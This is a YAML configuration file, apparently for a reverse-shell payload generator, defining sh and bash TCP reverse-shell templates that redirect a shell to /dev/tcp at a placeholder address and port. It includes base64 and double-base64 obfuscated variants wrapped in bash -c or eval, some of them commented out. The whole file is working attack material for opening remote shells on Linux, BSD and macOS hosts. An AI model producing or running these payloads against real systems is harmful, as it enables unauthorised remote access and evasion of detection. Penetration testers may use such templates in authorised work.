---

payload: cmd
direction: reverse

payloads:
  #sh:
  #  name: sh-shells
  #  desc: Shells created with sh command
  #  items:
  #    - name: tcp-reverse-sh
  #      desc: TCP reverse shell with sh command
  #      filters:
  #        os: ["bsd", "linux", "mac"]
  #        shells: ["sh", "bash", "csh", "zsh"]
  #        commands: []
  #        obfuscated: False
  #        proto: tcp
  #      variables:
  #        - name: shell
  #          filters:
  #            shell_var: "{VAR:shell}"
  #            shells: ["{VAR:shell}"]
  #          values:
  #            - sh
  #            - /bin/sh
  #        - name: minus_i
  #          filters: {}
  #          values:
  #            - ""
  #            - " -i"
  #      payload: |-
  #        {VAR:shell}{VAR:minus_i}>&/dev/tcp/__ADDR__/__PORT__ 0>&1
  #      variations:
  #        - name: "eval base64"
  #          filters:
  #            commands: ["eval", "base64"]
  #            obfuscated: true
  #          payload: eval $(echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d)
  #        - name: "eval base64 base64"
  #          filters:
  #            commands: ["eval", "base64"]
  #            obfuscated: true
  #          payload: eval $(echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d|base64 -d)
  bash:
    name: bash-shells
    desc: Shells created with bash command
    items:
      - name: tcp-reverse-sh
        desc: TCP reverse shell with sh command
        filters:
          os: ["bsd", "linux", "mac"]
          shells: ["bash"]
          commands: []
          obfuscated: False
          proto: tcp
        variables:
          - name: shell
            filters:
              shell_var: "{VAR:shell}"
              shells: ["{VAR:shell}"]
            values:
              - bash
              - /bin/bash
          - name: minus_i
            filters: {}
            values:
              - ""
              - " -i"
        payload: |-
          {VAR:shell}{VAR:minus_i}>&/dev/tcp/__ADDR__/__PORT__ 0>&1
        variations:
          # bash -c base64
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscated: true
            payload: bash -c "$(echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d)"
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscated: true
            payload: bash -c "`echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d`"

          # bash -c base64 base64
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscated: true
            payload: bash -c "$(echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d)"
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscated: true
            payload: bash -c "`echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d`"

          ## eval base64
          #- name: "eval base64"
          #  filters:
          #    commands: ["eval", "base64"]
          #    obfuscated: true
          #  payload: eval $(echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d)
          #- name: "eval base64"
          #  filters:
          #    commands: ["eval", "base64"]
          #    obfuscated: true
          #  payload: eval `echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d`

          ## eval base64 base64
          #- name: "eval base64 base64"
          #  filters:
          #    commands: ["eval", "base64"]
          #    obfuscated: true
          #  payload: eval $(echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d|base64 -d)
          #- name: "eval base64 base64"
          #  filters:
          #    commands: ["eval", "base64"]
          #    obfuscated: true
          #  payload: eval `echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d|base64 -d1`
